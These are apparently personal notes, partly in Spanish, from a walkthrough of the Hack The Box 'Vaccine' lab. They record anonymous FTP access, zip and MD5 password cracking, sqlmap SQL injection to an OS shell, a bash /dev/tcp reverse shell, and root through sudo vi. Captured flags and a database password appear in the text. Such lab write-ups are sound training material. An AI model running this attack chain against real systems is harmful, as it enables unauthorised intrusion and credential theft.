RECON
=====
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Initiating Connect Scan at 20:20
Scanning vaccine (10.129.151.110) [65535 ports]
Discovered open port 21/tcp on 10.129.151.110
Discovered open port 80/tcp on 10.129.151.110
Discovered open port 22/tcp on 10.129.151.110

FTP
===
└─$ telnet vaccine 21       
Trying 10.129.151.110...
Connected to vaccine.
Escape character is '^]'.
220 (vsFTPd 3.0.3)



└─$ ftp vaccine
Connected to vaccine.
220 (vsFTPd 3.0.3)
Name (vaccine:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10071|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10688|)
150 Opening BINARY mode data connectionN for backup.zip (2533 bytes).
100% |*************************************|  2533        1.27 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (20.60 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||10070|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> 



PROTEGIDO POR CONTRASEÑA.
------------------------
┌──(kali㉿kali)-[~/…/hackthebox/TIER2/vaccine/ftp]
└─$   

┌──(kali㉿kali)-[~/…/hackthebox/TIER2/vaccine/ftp]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip 


PASSWORD FOUND!!!!: pw == 741852963
                                                                                            
┌──(kali㉿kali)-[~/…/hackthebox/TIER2/vaccine/ftp]



2cb42f8734ea607eefed3b70af13bbd3

La contraseña está en md5

La craqueo aquí y entro al dashboard
qwerty789

http://vaccine/dashboard.php?search=%27

sqlmap --cookie="PHPSESSID=9rrnia5e43noa6nf3cncme332j" -u http://vaccine/dashboard.php?search=1 --dbs

[*] information_schema
[*] pg_catalog
[*] public

SQL_MAP provee de una shell
---------------------------
sqlmap -u http://vaccine/dashboard.php?search=1 --cookie="PHPSESSID=2sqi3gvnj0t7k56rvhsk6dc8v3" --os-shell

Shell inversa mediante /dev/tcp
-------------------------------

bash -c "bash -i >& /dev/tcp/10.10.14.79/443 0>&1"


postgres@vaccine:/var/lib/postgresql$ ls
ls
11
user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7 <<<<<<<<<<<<<<<<<<<<<<<<
postgres@vaccine:/var/lib/postgresql$ 

uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) postgres@vaccine:/var/lib/postgresql/11/main$ - 
find / -group ssl-cert 2>/dev/null 
find / -perm /4000 2>/dev/null > lala.txt

find / -perm /4000 2>/dev/null | xargs ls -l > lala.txt

$var/lib/postgresql/11/main$ 



---------------------------- TTY INTERACTIVA ---------------

python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm


-------------------------------------------------------------


└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.79] from (UNKNOWN) [10.129.18.225] 53532
bash: cannot set terminal process group (2870): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
cd /var/www/html
postgres@vaccine:/var/www/html$ cat index.php
cat index.php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>

----------------------



dashboard.php
-------------

        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

ssh postgres@ssh 


[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ 

https://gtfobins.github.io/gtfobins/vi/#sudo




-----------------

$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf  

# whoami
root
# ls
11  user.txt
# cd ~
# ls
pg_hba.conf  root.txt  snap
# cat root.txt
dd6e058e814260bc70e9bbdef2715849 <<<<<<<<<<<<<<<<<<<<<<<<<<<<

